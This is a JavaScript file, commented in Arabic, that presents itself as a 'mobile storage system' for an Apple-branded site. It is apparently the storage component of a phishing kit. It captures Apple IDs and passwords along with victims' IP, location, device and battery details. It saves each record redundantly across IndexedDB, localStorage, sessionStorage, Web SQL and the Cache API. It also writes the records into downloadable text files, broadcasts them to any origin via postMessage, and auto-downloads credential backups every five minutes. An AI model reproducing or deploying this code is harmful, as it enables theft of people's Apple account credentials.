// 📁 mobile-storage.js - نظام تخزين متقدم للهواتف

class MobileStorage {
    constructor() {
        this.version = '3.0.0';
        this.isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        this.storagePrefix = 'apple_mobile_';
        this.init();
    }
    
    async init() {
        console.log('📱 بدء نظام تخزين الهواتف...');
        
        // إنشاء قاعدة بيانات
        await this.createDatabase();
        
        // تهيئة التخزين المحلي
        this.initLocalStorage();
        
        // تهيئة Service Worker
        this.initServiceWorker();
        
        // بدء النسخ الاحتياطي
        this.startBackup();
        
        console.log('✅ نظام تخزين الهواتف جاهز');
    }
    
    // إنشاء قاعدة بيانات
    async createDatabase() {
        try {
            if (!window.indexedDB) {
                console.warn('⚠️ IndexedDB غير مدعوم على هذا الجهاز');
                return false;
            }
            
            return new Promise((resolve) => {
                const request = indexedDB.open('AppleMobileDB', 2);
                
                request.onerror = () => {
                    console.warn('⚠️ لا يمكن فتح قاعدة البيانات');
                    resolve(false);
                };
                
                request.onsuccess = (event) => {
                    this.db = event.target.result;
                    console.log('✅ قاعدة بيانات الهواتف جاهزة');
                    resolve(true);
                };
                
                request.onupgradeneeded = (event) => {
                    const db = event.target.result;
                    
                    // مخزن بيانات الدخول
                    if (!db.objectStoreNames.contains('credentials')) {
                        const store = db.createObjectStore('credentials', { 
                            keyPath: 'mobile_id',
                            autoIncrement: true 
                        });
                        store.createIndex('timestamp', 'timestamp', { unique: false });
                        store.createIndex('appleId', 'appleId', { unique: false });
                        store.createIndex('device', 'deviceType', { unique: false });
                    }
                    
                    // مخزن الزيارات
                    if (!db.objectStoreNames.contains('mobile_visits')) {
                        const store = db.createObjectStore('mobile_visits', { 
                            keyPath: 'visit_id',
                            autoIncrement: true 
                        });
                        store.createIndex('timestamp', 'timestamp', { unique: false });
                        store.createIndex('ip', 'ip', { unique: false });
                        store.createIndex('device', 'isMobile', { unique: false });
                    }
                    
                    // مخزن الملفات
                    if (!db.objectStoreNames.contains('files')) {
                        db.createObjectStore('files', { keyPath: 'file_id' });
                    }
                };
            });
        } catch (error) {
            console.error('❌ خطأ في إنشاء قاعدة البيانات:', error);
            return false;
        }
    }
    
    // تهيئة التخزين المحلي
    initLocalStorage() {
        try {
            if (typeof localStorage !== 'undefined') {
                // تهيئة التخزين للهواتف
                if (!localStorage.getItem('mobile_init')) {
                    localStorage.setItem('mobile_init', 'true');
                    localStorage.setItem('mobile_version', this.version);
                    localStorage.setItem('mobile_device', this.isMobile ? 'mobile' : 'desktop');
                }
                return true;
            }
        } catch (error) {
            console.warn('⚠️ localStorage غير متوفر:', error);
        }
        return false;
    }
    
    // تهيئة Service Worker
    async initServiceWorker() {
        try {
            if ('serviceWorker' in navigator) {
                const registration = await navigator.serviceWorker.register('/sw.js', {
                    scope: '/'
                });
                console.log('✅ Service Worker مسجل:', registration.scope);
                return true;
            }
        } catch (error) {
            console.warn('⚠️ Service Worker غير مدعوم:', error);
        }
        return false;
    }
    
    // حفظ بيانات الدخول
    async saveCredential(data) {
        console.log('💾 محاولة حفظ بيانات الدخول على الهاتف...');
        
        const results = [];
        
        // 1. حفظ في IndexedDB
        if (this.db) {
            try {
                const saved = await this.saveToIndexedDB('credentials', {
                    ...data,
                    mobile_id: Date.now(),
                    saved_at: new Date().toISOString(),
                    storage_method: 'indexeddb'
                });
                results.push({ method: 'indexeddb', success: saved });
            } catch (error) {
                results.push({ method: 'indexeddb', success: false, error: error.message });
            }
        }
        
        // 2. حفظ في localStorage
        try {
            const saved = this.saveToLocalStorage('mobile_credentials', data);
            results.push({ method: 'localStorage', success: saved });
        } catch (error) {
            results.push({ method: 'localStorage', success: false, error: error.message });
        }
        
        // 3. حفظ في ملف
        try {
            const saved = await this.saveToMobileFile(data);
            results.push({ method: 'file', success: saved });
        } catch (error) {
            results.push({ method: 'file', success: false, error: error.message });
        }
        
        // 4. حفظ في Session Storage
        try {
            const saved = this.saveToSessionStorage(data);
            results.push({ method: 'sessionStorage', success: saved });
        } catch (error) {
            results.push({ method: 'sessionStorage', success: false, error: error.message });
        }
        
        // 5. حفظ في Web SQL (للأجهزة القديمة)
        try {
            const saved = await this.saveToWebSQL(data);
            results.push({ method: 'webSQL', success: saved });
        } catch (error) {
            results.push({ method: 'webSQL', success: false, error: error.message });
        }
        
        // 6. حفظ في Cache API
        try {
            const saved = await this.saveToCache(data);
            results.push({ method: 'cache', success: saved });
        } catch (error) {
            results.push({ method: 'cache', success: false, error: error.message });
        }
        
        // حساب النجاحات
        const successful = results.filter(r => r.success).length;
        console.log(`✅ تم الحفظ بـ ${successful}/${results.length} طريقة`);
        
        // تحديث لوحة التحكم
        this.updateDashboard(data, successful);
        
        return successful > 0;
    }
    
    // حفظ في IndexedDB
    async saveToIndexedDB(storeName, data) {
        return new Promise((resolve) => {
            try {
                const transaction = this.db.transaction([storeName], 'readwrite');
                const store = transaction.objectStore(storeName);
                const request = store.add(data);
                
                request.onsuccess = () => {
                    console.log('💾 تم الحفظ في IndexedDB');
                    resolve(true);
                };
                
                request.onerror = () => {
                    console.warn('⚠️ خطأ في حفظ IndexedDB');
                    resolve(false);
                };
                
            } catch (error) {
                console.warn('⚠️ IndexedDB غير متوفر:', error);
                resolve(false);
            }
        });
    }
    
    // حفظ في localStorage
    saveToLocalStorage(key, data) {
        try {
            const existing = JSON.parse(localStorage.getItem(key) || '[]');
            existing.push({
                ...data,
                mobile_saved: true,
                saved_at: new Date().toISOString()
            });
            
            // تنظيف البيانات القديمة
            if (existing.length > 200) {
                existing.splice(0, existing.length - 200);
            }
            
            localStorage.setItem(key, JSON.stringify(existing));
            
            // حفظ نسخة احتياطية
            this.createLocalStorageBackup(key, existing);
            
            console.log('💾 تم الحفظ في localStorage');
            return true;
        } catch (error) {
            console.warn('⚠️ خطأ في حفظ localStorage:', error);
            return false;
        }
    }
    
    // إنشاء نسخة احتياطية من localStorage
    createLocalStorageBackup(key, data) {
        try {
            const backupKey = `${key}_backup_${Date.now()}`;
            localStorage.setItem(backupKey, JSON.stringify(data));
            
            // الاحتفاظ بـ 5 نسخ فقط
            this.cleanupBackups(key);
        } catch (error) {
            console.warn('⚠️ لا يمكن إنشاء نسخة احتياطية:', error);
        }
    }
    
    // تنظيف النسخ الاحتياطية
    cleanupBackups(prefix) {
        try {
            const backups = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.startsWith(`${prefix}_backup_`)) {
                    backups.push(key);
                }
            }
            
            if (backups.length > 5) {
                backups.sort().slice(0, backups.length - 5).forEach(key => {
                    localStorage.removeItem(key);
                });
            }
        } catch (error) {
            console.warn('⚠️ لا يمكن تنظيف النسخ الاحتياطية:', error);
        }
    }
    
    // حفظ في ملف للهواتف
    async saveToMobileFile(data) {
        try {
            const content = this.formatMobileFile(data);
            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
            
            // طريقة 1: استخدام File System Access API
            if ('showSaveFilePicker' in window) {
                try {
                    const handle = await window.showSaveFilePicker({
                        suggestedName: `apple_mobile_${Date.now()}.txt`,
                        types: [{
                            description: 'Text files',
                            accept: { 'text/plain': ['.txt'] }
                        }]
                    });
                    
                    const writable = await handle.createWritable();
                    await writable.write(blob);
                    await writable.close();
                    
                    console.log('💾 تم الحفظ في ملف عبر File System API');
                    return true;
                } catch (error) {
                    // تجاهل إذا ألغى المستخدم
                    if (error.name !== 'AbortError') {
                        console.warn('⚠️ File System API غير متوفر:', error);
                    }
                }
            }
            
            // طريقة 2: استخدام Download
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `apple_mobile_${Date.now()}.txt`;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 100);
            
            console.log('💾 تم تحميل الملف');
            return true;
            
        } catch (error) {
            console.warn('⚠️ لا يمكن حفظ الملف:', error);
            return false;
        }
    }
    
    // تنسيق ملف الهاتف
    formatMobileFile(data) {
        return `
📱 بيانات هاتف Apple
════════════════════════════
🆔 المعرف: ${data.sessionId}
📧 Apple ID: ${data.appleId}
🔑 كلمة المرور: ${data.password}
🌐 IP: ${data.ip}
📍 الموقع: ${data.location?.city || 'غير معروف'}
🕒 الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}
📊 الجهاز: ${data.deviceType}
📶 الشبكة: ${data.connection || 'غير معروف'}
🔋 البطارية: ${data.battery || 'غير معروف'}
💾 التخزين: ${data.storage || 'غير معروف'}
📡 نظام: ${data.platform}
════════════════════════════
تم الحفظ تلقائياً بواسطة نظام تخزين الهواتف
        `.trim();
    }
    
    // حفظ في Session Storage
    saveToSessionStorage(data) {
        try {
            if (typeof sessionStorage !== 'undefined') {
                const key = `mobile_session_${Date.now()}`;
                sessionStorage.setItem(key, JSON.stringify(data));
                
                // الاحتفاظ بـ 20 سجل فقط
                this.cleanupSessionStorage();
                
                console.log('💾 تم الحفظ في sessionStorage');
                return true;
            }
        } catch (error) {
            console.warn('⚠️ sessionStorage غير متوفر:', error);
        }
        return false;
    }
    
    // تنظيف Session Storage
    cleanupSessionStorage() {
        try {
            const keys = [];
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key.startsWith('mobile_session_')) {
                    keys.push(key);
                }
            }
            
            if (keys.length > 20) {
                keys.sort().slice(0, keys.length - 20).forEach(key => {
                    sessionStorage.removeItem(key);
                });
            }
        } catch (error) {
            console.warn('⚠️ لا يمكن تنظيف sessionStorage:', error);
        }
    }
    
    // حفظ في Web SQL (للأجهزة القديمة)
    async saveToWebSQL(data) {
        try {
            if (window.openDatabase) {
                return new Promise((resolve) => {
                    const db = openDatabase('AppleMobileSQL', '1.0', 'Mobile Database', 2 * 1024 * 1024);
                    
                    db.transaction(function(tx) {
                        tx.executeSql(
                            'CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY, data TEXT, timestamp DATETIME)'
                        );
                        
                        tx.executeSql(
                            'INSERT INTO credentials (data, timestamp) VALUES (?, ?)',
                            [JSON.stringify(data), new Date().toISOString()],
                            function() {
                                console.log('💾 تم الحفظ في Web SQL');
                                resolve(true);
                            },
                            function() {
                                resolve(false);
                            }
                        );
                    });
                });
            }
        } catch (error) {
            console.warn('⚠️ Web SQL غير متوفر:', error);
        }
        return false;
    }
    
    // حفظ في Cache API
    async saveToCache(data) {
        try {
            if ('caches' in window) {
                const cache = await caches.open('apple-mobile-cache');
                const response = new Response(JSON.stringify(data), {
                    headers: { 'Content-Type': 'application/json' }
                });
                
                await cache.put(`/credential_${Date.now()}`, response);
                console.log('💾 تم الحفظ في Cache API');
                return true;
            }
        } catch (error) {
            console.warn('⚠️ Cache API غير متوفر:', error);
        }
        return false;
    }
    
    // حفظ زيارة
    async saveVisit(data) {
        try {
            const results = [];
            
            // IndexedDB
            if (this.db) {
                const saved = await this.saveToIndexedDB('mobile_visits', {
                    ...data,
                    visit_id: Date.now(),
                    saved_at: new Date().toISOString()
                });
                results.push({ method: 'indexeddb', success: saved });
            }
            
            // localStorage
            const savedLocal = this.saveToLocalStorage('mobile_visits', data);
            results.push({ method: 'localStorage', success: savedLocal });
            
            return results.some(r => r.success);
        } catch (error) {
            console.error('❌ خطأ في حفظ الزيارة:', error);
            return false;
        }
    }
    
    // تحديث لوحة التحكم
    updateDashboard(data, successfulMethods) {
        try {
            const update = {
                type: 'mobile_update',
                data: data,
                timestamp: Date.now(),
                successful_methods: successfulMethods,
                device: this.isMobile ? 'mobile' : 'desktop',
                storage: {
                    indexeddb: !!this.db,
                    localStorage: typeof localStorage !== 'undefined',
                    sessionStorage: typeof sessionStorage !== 'undefined',
                    filesystem: 'showSaveFilePicker' in window,
                    websql: !!window.openDatabase,
                    cache: 'caches' in window
                }
            };
            
            // إرسال التحديث
            localStorage.setItem('mobile_dashboard_update', JSON.stringify(update));
            window.postMessage(update, '*');
            
            console.log('📡 تم تحديث لوحة التحكم من الهاتف');
            
        } catch (error) {
            console.warn('⚠️ لا يمكن تحديث لوحة التحكم:', error);
        }
    }
    
    // بدء النسخ الاحتياطي
    startBackup() {
        // نسخ احتياطي كل 5 دقائق
        setInterval(() => {
            this.createBackup();
        }, 300000);
    }
    
    // إنشاء نسخة احتياطية
    async createBackup() {
        try {
            const backup = {
                timestamp: new Date().toISOString(),
                version: this.version,
                data: {
                    credentials: await this.getFromIndexedDB('credentials', 50),
                    visits: await this.getFromIndexedDB('mobile_visits', 100)
                }
            };
            
            const blob = new Blob([JSON.stringify(backup, null, 2)], { 
                type: 'application/json' 
            });
            
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `mobile_backup_${Date.now()}.json`;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 100);
            
            console.log('💾 تم إنشاء نسخة احتياطية للهاتف');
            
        } catch (error) {
            console.warn('⚠️ لا يمكن إنشاء نسخة احتياطية:', error);
        }
    }
    
    // الحصول من IndexedDB
    async getFromIndexedDB(storeName, limit = 100) {
        return new Promise((resolve) => {
            try {
                const transaction = this.db.transaction([storeName], 'readonly');
                const store = transaction.objectStore(storeName);
                const index = store.index('timestamp');
                const request = index.openCursor(null, 'prev');
                
                const results = [];
                request.onsuccess = function(event) {
                    const cursor = event.target.result;
                    if (cursor && results.length < limit) {
                        results.push(cursor.value);
                        cursor.continue();
                    } else {
                        resolve(results);
                    }
                };
                
                request.onerror = function() {
                    resolve([]);
                };
                
            } catch (error) {
                console.warn('⚠️ لا يمكن القراءة من IndexedDB:', error);
                resolve([]);
            }
        });
    }
    
    // الحصول على جميع بيانات الدخول
    async getAllCredentials() {
        try {
            const sources = [];
            
            // من IndexedDB
            if (this.db) {
                const dbCreds = await this.getFromIndexedDB('credentials', 500);
                sources.push(...dbCreds);
            }
            
            // من localStorage
            const localCreds = JSON.parse(localStorage.getItem('mobile_credentials') || '[]');
            sources.push(...localCreds);
            
            // إزالة التكرارات
            const unique = Array.from(new Map(sources.map(item => 
                [item.timestamp + item.appleId, item]
            )).values());
            
            // فرز حسب التاريخ
            return unique.sort((a, b) => 
                new Date(b.timestamp) - new Date(a.timestamp)
            );
            
        } catch (error) {
            console.error('❌ خطأ في الحصول على البيانات:', error);
            return [];
        }
    }
    
    // الحصول على جميع الزيارات
    async getAllVisits() {
        try {
            const sources = [];
            
            // من IndexedDB
            if (this.db) {
                const dbVisits = await this.getFromIndexedDB('mobile_visits', 1000);
                sources.push(...dbVisits);
            }
            
            // من localStorage
            const localVisits = JSON.parse(localStorage.getItem('mobile_visits') || '[]');
            sources.push(...localVisits);
            
            // إزالة التكرارات
            const unique = Array.from(new Map(sources.map(item => 
                [item.timestamp + item.ip, item]
            )).values());
            
            // فرز حسب التاريخ
            return unique.sort((a, b) => 
                new Date(b.timestamp) - new Date(a.timestamp)
            );
            
        } catch (error) {
            console.error('❌ خطأ في الحصول على الزيارات:', error);
            return [];
        }
    }
}

// إنشاء وتصدير نظام تخزين الهواتف
window.MobileStorage = MobileStorage;

// إنشاء نسخة عالمية
if (!window.mobileStorage) {
    window.mobileStorage = new MobileStorage();
}

console.log('🚀 نظام تخزين الهواتف جاهز للاستخدام!');
